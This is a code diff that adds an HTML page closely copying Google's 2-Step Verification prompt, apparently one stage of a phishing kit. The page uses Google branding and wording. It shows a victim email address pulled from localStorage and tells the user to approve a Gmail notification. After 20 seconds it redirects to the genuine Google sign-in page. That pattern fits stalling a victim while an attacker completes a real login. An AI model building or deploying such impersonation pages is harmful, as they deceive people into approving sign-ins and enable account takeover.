@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>authpage</title>
+  <link rel="stylesheet" href="2-step.css">
+</head>
+<body>
+  <div class="container">
+    <div class="google_g_logo">
+      <img src="images/Google__G__logo.svg.png" alt="Google G logo" width="44" height="44">
+    </div>
+
+    <div class="name_container">
+      <span jsslot="">2-Step Verification</span>
+    </div>
+
+    <div class="text_container">
+      <span jsslot="">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</span>
+    </div>
+
+        <!-- Account Info -->
+        <div class="account">
+          <a href="mailto:" id="emailLink">
+            <span id="emailText"></span>
+          </a>
+        </div>
+
+    <div class="video">
+      <video autoplay loop muted playsinline>
+          <source src="video/google-video.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+      </video>
+    </div>
+  
+    <div class="open">
+      Open the Gmail app on your mobile device
+    </div>
+
+    <div class="small_text">
+      Google sent you a notification to your mobile device. Open the Gmail app and tap<b><span style="color: rgb(0, 0, 0); margin-left: 4px;">Yes</span></b> on the prompt to verify it's you.
+    </div>
+
+    <!-- Clickable Box to Show Check Mark -->
+    <div id="togglePassword"></div>
+
+    <div class="dont_show_again">Don't ask again on this divice</div>
+
+    <div class="resend_it">
+      <a href="" target="_blank">Resend it</a>
+    </div>
+
+    <div class="try_another_way">
+      <a href="https://support.google.com/accounts/thread/114548241/try-another-way?hl=en" target="_blank">Try another way</a>
+    </div>
+
+    <div class="user_photo">
+      <img src="images/user_photo.png" alt="user_photo" width="27" height="25" >
+    </div>
+
+
+  </div>
+
+  <script>
+    // Slow down the video speed once the page is loaded
+    document.addEventListener('DOMContentLoaded', function() {
+    const emailText = document.getElementById("emailText");
+    const emailLink = document.getElementById("emailLink");
+    const account = document.querySelector(".account");
+
+    const email = localStorage.getItem("email");
+
+    if (email) {
+        emailText.textContent = email;
+        emailLink.href = `mailto:${email}`;
+
+        let baseWidth = 80; // Default minimum width
+
+        if (email.length > 30) {
+            baseWidth = 188;
+          } else if (email.length > 29) {
+            baseWidth = 185;
+          } else if (email.length > 28) {
+            baseWidth = 180
+          } else if (email.length > 27) {
+            baseWidth = 175;
+          } else if (email.length > 26) {
+            baseWidth = 170;
+          } else if (email.length > 25) {
+            baseWidth = 165;
+        } else if (email.length > 24) {
+            baseWidth = 160;
+        } else if (email.length > 23) {
+            baseWidth = 155;
+        } else if (email.length > 22) {
+            baseWidth = 150;
+        } else if (email.length > 21) {
+            baseWidth = 145;
+        } else if (email.length > 20) {
+            baseWidth = 130;
+        } else if (email.length > 19) {
+            baseWidth = 125;
+        } else if (email.length > 18) {
+            baseWidth = 120;
+        } else if (email.length > 17) {
+            baseWidth = 115;
+        } else if (email.length > 16) {
+            baseWidth = 110;
+        } else if (email.length > 15) {
+            baseWidth = 105;
+          } else if (email.length > 14) {
+            baseWidth = 100;
+          } else if (email.length > 13) {
+            baseWidth = 90;
+        } else if (email.length > 12) {
+            baseWidth = 85;
+        } else if (email.length > 10) {
+            baseWidth = 80;
+        }
+
+        account.style.width = `${baseWidth + 10}px`; // Add some padding
+        setTimeout(function() {
+      window.location.href = "https://accounts.google.com/";
+    }, 20000); // 10 seconds (10000 milliseconds)
+
+    }
+
+      video.playbackRate = 0.62; // Slow down to 50% speed
+    });
+
+    // Toggle the check mark on click
+    document.getElementById("togglePassword").addEventListener("click", function() {
+      this.classList.toggle("show-password");
+    });
+  </script>
+</body>
+</html>
